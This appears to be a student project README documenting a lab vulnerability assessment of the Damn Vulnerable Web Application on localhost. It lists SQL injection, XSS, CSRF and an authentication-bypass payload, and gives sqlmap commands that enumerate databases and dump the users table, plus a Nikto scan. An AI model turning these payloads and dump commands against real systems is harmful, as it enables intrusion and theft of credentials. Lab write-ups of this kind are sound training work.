# 🔐 Web Application Security Testing (DVWA)

This project documents a hands-on vulnerability assessment of the **Damn Vulnerable Web Application (DVWA)** using industry-standard tools and manual testing methods.

---

## 📌 Project Overview
- **Project**: Vulnerability Assessment on DVWA  
- **Tools Used**: SQLMap, Nikto, Manual (Browser) Testing  
- **Environment**: Kali Linux 2025  
- **Prepared by**: RAWLINGS ODIERO  
- **Date**: August 2025  
- **Task**: FutureInterns – Task 1  

---

## 🧪 Vulnerabilities Identified
1. **SQL Injection** (manual + automated with SQLMap)
2. **Cross-Site Scripting (XSS)** – Reflected XSS + Cookie Disclosure
3. **Cross-Site Request Forgery (CSRF)** – Manual .html form
4. **Authentication Bypass** – `' OR '1'='1`
5. **Directory Listing & Server Misconfigurations** (Nikto)
6. **Apache Server Info Disclosure & PHP Shells** – via Nikto

---

## 🧰 Tools & Commands

### 🔸 SQLMap Automation
```bash
sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=62872aa381f5f24da77630834bef64d1" --batch --dbs

sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=62872aa381f5f24da77630834bef64d1" -D dvwa --tables

sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=62872aa381f5f24da77630834bef64d1" -D dvwa -T users --dump

🔸 Nikto Scan
nikto -h http://127.0.0.1 -o dvwa-nikto-report.html -Format html

